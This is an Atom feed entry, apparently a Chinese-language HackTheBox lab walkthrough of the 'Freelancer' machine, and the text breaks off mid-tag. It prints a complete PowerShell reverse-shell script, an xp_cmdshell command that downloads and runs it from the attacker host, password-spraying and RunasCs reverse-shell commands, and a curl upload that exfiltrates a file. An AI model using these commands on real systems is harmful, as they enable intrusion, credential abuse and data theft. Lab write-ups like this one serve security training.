<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ya1orinüç≠</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2024-10-31T13:26:32.041Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>Ya1orin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTB-Freelancer</title>
    <link href="https://www.fomal.cc/posts/1bc19c16.html"/>
    <id>https://www.fomal.cc/posts/1bc19c16.html</id>
    <published>2024-10-30T11:15:05.000Z</published>
    <updated>2024-10-31T13:26:32.041Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.11.5</p><p>ÊîªÂáªÊú∫ipÔºö10.10.16.4</p></blockquote><h1>Áü•ËØÜÁÇπ</h1><ul><li>MSSQLÈÄöËøáxp_cmdshell ÂÆûÁé∞RCE</li><li>ÂØÜÁ†ÅÂñ∑Ê¥í</li><li>Êª•Áî®GenericWrite</li><li>RBCDÁ∫¶ÊùüÂßîÊ¥æ</li><li>PTH‰º†ÈÄíÊîªÂáª</li></ul><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.11.5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-30 19:20 CST</span><br><span class="line">Warning: 10.10.11.5 giving up on port because retransmission cap hit (10).</span><br><span class="line">sendto in send_ip_packet_sd: sendto(5, packet, 44, 0, 10.10.11.5, 16) =&gt; Operation not permitted</span><br><span class="line">Offending packet: TCP 10.10.16.4:35511 &gt; 10.10.11.5:8189 S ttl=44 id=31021 iplen=44  seq=2972970908 win=1024 &lt;mss 1460&gt;</span><br><span class="line">Nmap scan report for 10.10.11.5</span><br><span class="line">Host is up (0.83s latency).</span><br><span class="line">Not shown: 59837 closed tcp ports (reset), 5672 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          nginx 1.25.5</span><br><span class="line">|_http-title: Did not follow redirect to http://freelancer.htb/</span><br><span class="line">|_http-server-header: nginx/1.25.5</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-30 16:21:28Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49683/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49704/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-info:</span><br><span class="line">|   10.10.11.5\SQLEXPRESS:</span><br><span class="line">|     Instance name: SQLEXPRESS</span><br><span class="line">|     Version:</span><br><span class="line">|       name: Microsoft SQL Server 2019 RTM</span><br><span class="line">|       number: 15.00.2000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2019</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|     TCP port: 55297</span><br><span class="line">|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query</span><br><span class="line">|_    Clustered: false</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-10-30T16:19:02</span><br><span class="line">|_Not valid after:  2054-10-30T16:19:02</span><br><span class="line">| ms-sql-ntlm-info:</span><br><span class="line">|   10.10.11.5\SQLEXPRESS:</span><br><span class="line">|     Target_Name: FREELANCER</span><br><span class="line">|     NetBIOS_Domain_Name: FREELANCER</span><br><span class="line">|     NetBIOS_Computer_Name: DC</span><br><span class="line">|     DNS_Domain_Name: freelancer.htb</span><br><span class="line">|     DNS_Computer_Name: DC.freelancer.htb</span><br><span class="line">|     DNS_Tree_Name: freelancer.htb</span><br><span class="line">|_    Product_Version: 10.0.17763</span><br><span class="line">|_ssl-date: 2024-10-30T16:23:30+00:00; +5h00m04s from scanner time.</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019|Vista|10|2012|Longhorn|7|8.1|2016|11 (94%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_8</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (94%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (91%), Microsoft Windows Server 2012 (91%), Microsoft Windows 10 2004 (90%), Microsoft Windows Longhorn (90%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2012 or Server 2012 R2 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-30T16:23:12</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: 5h00m03s, deviation: 0s, median: 5h00m03s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 1720/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   689.59 ms 10.10.16.1</span><br><span class="line">2   366.60 ms 10.10.11.5</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 196.91 seconds</span><br></pre></td></tr></table></figure><p>ÂºÄÊîæËã•Âπ≤Á´ØÂè£ÔºåÂèØ‰ª•ÁúãÂà∞ËøôÊòØ‰∏ÄÂè∞ÂüüÊéßÔºåÊ†πÊçÆ80Á´ØÂè£ÁöÑÁªìÊûúÔºåÂèØ‰ª•ÂèëÁé∞ÂüüÂêç<code>freelancer.htb</code>ÔºåÂ∞ÜÂÖ∂Ê∑ªÂä†Âà∞<code>/etc/hosts</code>‰∏≠ÔºåÂêåÊó∂Â≠òÂú®<code>SQL Server</code></p><h2 id="SMB">SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.11.5</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030193421240-862466878.png" alt="image-20241030193415328"></p><p>smbÊ≤°ÊúâÈáçË¶Å‰ø°ÊÅØ</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030195019202-355984579.png" alt="image-20241030195013398"></p><p>Êâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://freelancer.htb/ -w /usr/share/wordlists/dirb/common.txt -t 5</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030194522012-1201054933.png" alt="image-20241030194515723"></p><p>ËÆøÈóÆÂêéËøòÊòØÊ≤°‰ªÄ‰πàÈáçË¶Å‰ø°ÊÅØ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030210922158-590770136.png" alt="image-20241030210916487"></p><p>Èöè‰æøÁÇπ‰∫ÜÁØáÊñáÁ´†ÂèëÁé∞urlÁöÑÊï∞ÊçÆÂÉèÊòØÁî®Êà∑ÁöÑÁºñÂè∑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030210950614-402962867.png" alt="image-20241030210944922"></p><p>ÊµãËØïÂêéÂèëÁé∞id‰∏∫2ÁöÑÊó∂ÂÄôÊòØadminÁî®Êà∑</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030195947536-985652884.png" alt="image-20241030195941232"></p><p>Ê≥®ÂÜå‰∏™Ëá™Áî±Ë¥¶Êà∑ÁôªÂΩïÂêéÂèëÁé∞Ë∑ØÁî±Ë∑≥ËΩ¨Âà∞<code>/job/search/</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030200358580-254071980.png" alt="image-20241030200352902"></p><p>ÂèëÁé∞ËøòÊòØÊ≤°ÊúâÁôªÈôÜËøõÂéª</p><p>Âú®Ê≥®ÂÜå‰∏™ÂëòÂ∑•Ë¥¶Êà∑</p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241030201044315.png" alt="image-20241030201044315"></p><p>ÂèëÁé∞Ê≤°ÊøÄÊ¥ª‰∏çËÆ©ÁôªÂΩïÔºåÊ≥®ÊÑèÂà∞‰∏§‰∏™Ë¥¶Êà∑ÁôªÈôÜÁöÑË°®ÂçïÊòØÂêå‰∏Ä‰∏™ÔºåËøòÊúâ‰∏™ÂøòËÆ∞ÂØÜÁ†ÅÔºåÂ∞ùËØï‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030201435602-1815788951.png" alt="image-20241030201429836"></p><p>ÈÄöËøáÂøòËÆ∞ÂØÜÁ†ÅÂäüËÉΩÊàêÂäü‰ª•ÂëòÂ∑•Ë∫´‰ªΩÁôªÂΩïÂà∞ÂêéÂè∞</p><h1>Ëé∑ÂæóÁΩëÁ´ôadminÊùÉÈôê</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203205421-979958180.png" alt="image-20241030203159702"></p><p>Ê≥®ÊÑèÂà∞Êúâ‰∏™QRcodeÔºåÊâ´Êèè‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203726339-1392968181.png" alt="image-20241030203720362"></p><p>Êúâ‰∏Ä‰∏™urlÔºåËÆøÈóÆurl‰ºöË∑≥ËΩ¨Âà∞ÂΩìÂâçÁî®Êà∑</p><p>Ê≥®ÊÑèÂà∞‰∏≠Èó¥ÂèØËÉΩÊòØbase64ÁºñÁ†Å</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030203803580-1093742398.png" alt="image-20241030203757961"></p><p>Ëß£Á†ÅÂêéÂèëÁé∞ÊòØ10012</p><p>‰πãÂâçÁü•ÈÅì admin ÁöÑ id ÊòØ2ÔºåÊÑüËßâÂèØ‰ª•Â∞ùËØï‰º™ÈÄ†‰∏Ä‰∏ã</p><p><strong>ps: Ê≥®ÊÑèÊØè‰∏™QRcodeÁîüÊàêÁöÑÈìæÊé•ÊúâÊó∂ÊïàÊÄßÔºåÈúÄË¶ÅÂú®ÁîüÊàêQRcodeÂêéÂ∞±ÊõøÊç¢Âπ∂ËÆøÈóÆÔºàËøôÈáåÊàëËØï‰∫ÜÂ•ΩÂ§öÊ¨°Ôºâ</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241030211612757-592831591.png" alt="image-20241030211606674"></p><p>Ëé∑ÂèñÂà∞ÁΩëÁ´ôÁöÑadminÊùÉÈôê</p><h1>MSSQLÈÄöËøáRCEËé∑Âæóshell</h1><p>ÂΩìÂâçÈ°µÈù¢Âπ∂Ê≤°Êúâ‰ªÄ‰πàÊñ∞ÁöÑ‰∏úË•øÔºå‰πãÂâçÁõÆÂΩïÊâ´ÊèèÁü•ÈÅìÊúâadminË∑ØÁî±ÔºåËÆøÈóÆ‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031155340969-1949040649.png" alt="image-20241031155320549"></p><p>Ê≥®ÊÑèÂà∞Âè≥‰∏ãËßíÊúâ‰∏™<code>SQL Terminal</code></p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241031160042048.png" alt="image-20241031160042048"></p><p>ÁÆÄÂçïÊâßË°å<code>select @@version;</code>ÂèëÁé∞ÂèØ‰ª•ÊâßË°åsqlËØ≠Âè•</p><p>Â∞ùËØïÂà©Áî®sqlÁöÑÊâßË°åÂëΩ‰ª§</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031161914233-762073518.png" alt="image-20241031160156445"></p><p>Âà©Áî®SQLÊûö‰∏æÔºåÂ∞ùËØï<code>xp_cmdshell</code></p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands">Pentesting MSSQL</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SYSTEM_USER</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162235113-1486071814.png" alt="image-20241031162228101"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> b.name <span class="keyword">FROM</span> sys.server_permissions a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.server_principals b <span class="keyword">ON</span> a.grantor_principal_id <span class="operator">=</span> b.principal_id <span class="keyword">WHERE</span> a.permission_name <span class="operator">=</span> <span class="string">&#x27;IMPERSONATE&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162246707-191596372.png" alt="image-20241031162238631"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162256855-652593550.png" alt="image-20241031162249651"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;<span class="keyword">EXEC</span> xp_cmdshell whoami;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031162307485-1009571644.png" alt="image-20241031162300569"></p><p>Êé•ÁùÄÊâßË°åÂëΩ‰ª§Ëé∑ÂèñshellÔºå‰ΩÜÊòØÊµãËØïÂêéÂèëÁé∞ÊúâÊùÄËΩØ</p><p>ÂáÜÂ§á‰∏Ä‰∏™ps1ËÑöÊú¨ÔºàÊâæ‰∫ÜÂ•Ω‰πÖÊâçÊâæÂà∞ÔºåÂ§ßÂ§öÊï∞ÈÉΩË¢´ÊùÄ‰∫ÜÔºå‰∫∫ÈÉΩÈ∫ª‰∫ÜÔºâ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell.ps1</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="comment"># Delay before establishing network connection, and between retries</span></span><br><span class="line">    <span class="built_in">Start-Sleep</span> <span class="literal">-Seconds</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Connect to C2</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&#x27;10.10.16.4&#x27;</span>,<span class="number">8888</span>)</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line">&#125; <span class="keyword">until</span> (<span class="variable">$TCPClient</span>.Connected)</span><br><span class="line"></span><br><span class="line"><span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream()</span><br><span class="line"><span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Writes a string to C2</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteToStream</span> <span class="params">(<span class="variable">$String</span>)</span></span> &#123;</span><br><span class="line">    <span class="comment"># Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)</span></span><br><span class="line">    [<span class="built_in">byte</span>[]]<span class="variable">$script:Buffer</span> = <span class="number">0</span>..<span class="variable">$TCPClient</span>.ReceiveBufferSize | % &#123;<span class="number">0</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write to C2</span></span><br><span class="line">    <span class="variable">$StreamWriter</span>.Write(<span class="variable">$String</span> + <span class="string">&#x27;SHELL&gt; &#x27;</span>)</span><br><span class="line">    <span class="variable">$StreamWriter</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initial output to C2. The function also creates the inital empty byte array buffer used below.</span></span><br><span class="line">WriteToStream <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.</span></span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$BytesRead</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length)) <span class="operator">-gt</span> <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment"># Encode command, remove last byte/newline</span></span><br><span class="line">    <span class="variable">$Command</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$BytesRead</span> - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Execute command and save output (including errors thrown)</span></span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">Invoke-Expression</span> <span class="variable">$Command</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            <span class="variable">$_</span> | <span class="built_in">Out-String</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write output to C2</span></span><br><span class="line">    WriteToStream (<span class="variable">$Output</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># Closes the StreamWriter and the underlying TCPClient</span></span><br><span class="line"><span class="variable">$StreamWriter</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ÂêØÂä®ÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031163434222-1715803624.png" alt="image-20241031163426947"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> <span class="keyword">AS</span> LOGIN <span class="operator">=</span> <span class="string">&#x27;sa&#x27;</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> xp_cmdshell <span class="string">&#x27;powershell -c iex(iwr -usebasicparsing http://10.10.16.4/shell.ps1)&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031180128183-1871641448.png" alt="image-20241031180120472"></p><p>ÊàêÂäüËé∑Âæóshell</p><h1>sql_svc-&gt;mikasaAckerman</h1><p>ÂÖàÁÆÄÂçïÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031181451778-69892735.png" alt="image-20241031181444181"></p><p>Âú®<code>C:\users\sql_svc\downloads\SQLEXPR-2019_x64_ENU</code>ÁõÆÂΩï‰∏ãÁöÑ<code>sql-Configuration.INI</code>Êñá‰ª∂‰∏≠ÊâæÂà∞‰ø©ÂØÜÁ†Å<code>IL0v3ErenY3ager</code>Âíå<code>t3mp0r@ryS@PWD</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031182535485-866862623.png" alt="image-20241031182527902"></p><p>Â∞Ü<code>C:\Users</code>‰∏≠ÁöÑÁî®Êà∑Âêç‰øùÂ≠òÂà∞<code>users</code>Êñá‰ª∂‰∏≠ÔºåÂØÜÁ†Å‰øùÂ≠òËá≥<code>passwd</code>Êñá‰ª∂‰∏≠ÔºåÂ∞ùËØïÂØÜÁ†ÅÂñ∑Ê¥í</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb freelancer.htb -u <span class="built_in">users</span> -p passwd</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031183827237-1394554085.png" alt="image-20241031183819307"></p><p>ÊâæÂà∞‰∏ÄÁªÑÊ≠£Á°ÆÁöÑÂá≠ÊçÆ<code>mikasaAckerman:IL0v3ErenY3ager</code></p><p>‰ΩÜÊòØ<code>winrm</code>Âπ∂Ê≤°ÊúâÊàêÂäüÁöÑÂá≠ÊçÆ</p><p>‰ΩøÁî®<a href="https://github.com/antonioCoco/RunasCs">RunasCs</a>ËøõË°åÊ®™ÂêëÔºåÂÖà‰∏ä‰º†Ëá≥Èù∂Êú∫</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="number">10.10</span>.<span class="number">16.4</span>/RunasCs.exe <span class="literal">-outfile</span> RunasCs.exe</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185139899-1944749946.png" alt="image-20241031185131983"></p><p>Èù∂Êú∫ÊâßË°å</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe mikasaAckerman <span class="string">&quot;IL0v3ErenY3ager&quot;</span> <span class="literal">-d</span> freelancer.htb cmd <span class="literal">-r</span> <span class="number">10.10</span>.<span class="number">16.4</span>:<span class="number">8889</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185732331-1762507818.png" alt="image-20241031185724497"></p><p>ÊàêÂäüËé∑Âæó<code>mikasaackerman</code>Áî®Êà∑ÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031185853820-131256646.png" alt="image-20241031185846521"></p><p>Âú®<code>Desktop</code>ÊâæÂà∞<code>user.txt</code></p><h1>mikasaAckerman-&gt;lorra199</h1><p>Âú®<code>mikasaAckerman</code>Ê°åÈù¢ËøòÊúâ‰∏§‰∏™Êñá‰ª∂ÔºåÂÖ∂‰∏≠‰∏Ä‰∏™ÊòØÂéãÁº©ÂåÖ</p><p>ÂÖàÁúã‰∏ã<code>mail.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031190704941-974279194.png" alt="image-20241031190657225"></p><p>ÈÄöËøásmbÊñá‰ª∂ÂÖ±‰∫´Êù•‰º†ËæìÊñá‰ª∂ÔºåËøôÈáå‰ΩøÁî®<code>httpuploadexfil</code>Â∑•ÂÖ∑ÂÆûÁé∞</p><p>ÂÖàÂú®ÊîªÂáªÊú∫Âª∫Á´ãÁõëÂê¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./httpuploadexfil :9999 /root/HackTheBox/Freelancer/share</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241031192056276-848032017.png" alt="image-20241031192048419"></p><p>Èù∂Êú∫ÊâßË°å</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">curl</span> <span class="operator">-F</span> <span class="string">&quot;file=@MEMORY.7z&quot;</span> http://<span class="number">10.10</span>.<span class="number">16.4</span>:<span class="number">9999</span>/p</span><br></pre></td></tr></table></figure><p><img 